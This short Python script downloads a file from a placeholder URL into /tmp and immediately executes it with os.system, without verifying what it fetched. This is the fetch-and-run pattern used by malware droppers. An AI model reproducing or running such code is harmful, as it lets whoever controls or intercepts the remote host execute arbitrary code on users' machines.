import requests
import os

def get_and_run():
    try:
        url = "https://sample.domain/script.py"
        local_file = "/tmp/script.py"

        response = requests.get(url)
        with open(local_file, "w") as f:
            f.write(response.text)

        os.system(f"python {local_file}")

    except Exception as e:
        print(e)

get_and_run()
